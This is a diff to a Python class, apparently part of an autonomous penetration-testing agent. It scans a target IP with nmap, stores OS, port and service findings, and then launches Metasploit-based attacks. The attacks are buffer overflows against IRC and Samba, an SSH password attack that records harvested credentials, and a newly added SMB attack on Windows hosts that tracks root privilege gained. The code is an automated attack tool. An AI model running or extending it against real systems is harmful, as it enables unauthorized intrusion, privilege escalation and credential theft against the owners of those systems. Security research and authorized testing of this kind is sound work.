@@ -43,25 +43,25 @@ class Main(agent.Agent):
         file_string = "Target IP Address is :" + self.beliefbase['target_ip_address'] + "\n"
         file_string = file_string + "Host IP Address is :" + self.beliefbase['host_ip_address'] + "\n"
         print("start to information gathering stage...")
-        # onto = self.load_ontology()
-        # target1 = onto.target.instances()[0]
+        onto = self.load_ontology()
+        target1 = onto.target.instances()[0]
         # print(target1.IP_address)
-        # target1.IP_address.append(target_ip)
+        target1.IP_address.append(target_ip)
         # print(target1.IP_address)
         # onto.save()
         print("Probe the target os...")
         print("Probe the target port...")
         print("Probe the target service ...")
-        print("Probe the target vulnerability ...")
         self.beliefbase['port'] = self.probe_port(target_ip)
 
         self.beliefbase['ostype'] = self.probe_os(target_ip)
-        target1.OS.append(self.beliefbase['ostype'])
+        # target1.OS.append(self.beliefbase['ostype'])
 
         # target1.port.extend(self.beliefbase['port'])
 
         self.beliefbase['service'], self.beliefbase['service_product'], self.beliefbase['service_cpe'] = self.probe_service(target_ip)
-
+        # for port in self.beliefbase['port']:
+        #     self.probe_vul(target_ip, port)
         return self
 
 
@@ -98,7 +98,7 @@ class Main(agent.Agent):
                         for osclass in osmatch['osclass']:
                             print(f'Ip Address : {host}')
                             print(f"the target system is {osclass['osfamily']}")
-                            # print('OsClass.type : {0}'.format(osclass))
+                            print('OsClass.type : {0}'.format(osclass))
                             print('-------------------------------------------')
                             file_string = file_string + osclass['osfamily'] + "\n"
                             self.write_on_file(file_string)
@@ -141,6 +141,17 @@ class Main(agent.Agent):
         self.write_on_file(file_string)
         return services, products, cpes
 
+    # def probe_vul(self, target_ip, port):
+    #     nmScan = nmap.PortScanner()
+    #     vul = []
+    #     # Scan for specific ports and services
+    #     # nmScan.scan(target_ip, '22-443', arguments='-sV --script vulners')
+    #     nmScan.scan(target_ip, str(port), arguments='-sV --script vulners')
+    #     # nmScan.scan(target_id, '22-443')
+    #     vulnerability_list = nmScan[target_ip]['tcp'].items()
+    #     print("vulnerability: ")
+    #     for item in vulnerability_list:
+    #         print(item , end='\n')
 
     def attack(self):
         file_string = ''
@@ -151,13 +162,14 @@ class Main(agent.Agent):
                 print("buffer overflow attack on IRC service is success ")
                 self.beliefbase['privilege'].append('root')
                 print('the current privilege is : {0}'.format(self.beliefbase['privilege']))
-        if 'samba' in self.beliefbase['service_cpe']:
+        if 'samba' in self.beliefbase['service_cpe'] or 445 in self.beliefbase['port'] and self.beliefbase['ostype'] == 'Linux':
             result = MetasploitAttack.samba_attack(self.beliefbase['target_ip_address'],
                                                  self.beliefbase['host_ip_address'])
             if result == 'root':
                 print("buffer overflow attack on samba service is success ")
                 self.beliefbase['privilege'].append(result)
                 print('the current privilege is : {0}'.format(self.beliefbase['privilege']))
+
         if 'ssh' in self.beliefbase['service']:
             print("starting ssh password attack without using specific Module...")
             result, ssh_password, username = MetasploitAttack.ssh_password_attack(self.beliefbase['target_ip_address'], self.beliefbase['host_ip_address'])
@@ -169,6 +181,13 @@ class Main(agent.Agent):
                 self.beliefbase['ssh_password'] = ssh_password
                 self.beliefbase['ssh_username'] = username
 
+        if 445 in self.beliefbase['port'] and self.beliefbase['ostype'] == 'Windows':
+            result = MetasploitAttack.smb_attack(self.beliefbase['target_ip_address'],
+                                                   self.beliefbase['host_ip_address'])
+            if result == 'root':
+                print("buffer overflow attack on samba service is success ")
+                self.beliefbase['privilege'].append(result)
+                print('the current privilege is : {0}'.format(self.beliefbase['privilege']))
 
     def write_on_file(self, line):
         with open("/home/fatemeh/report.txt", "a+") as f:
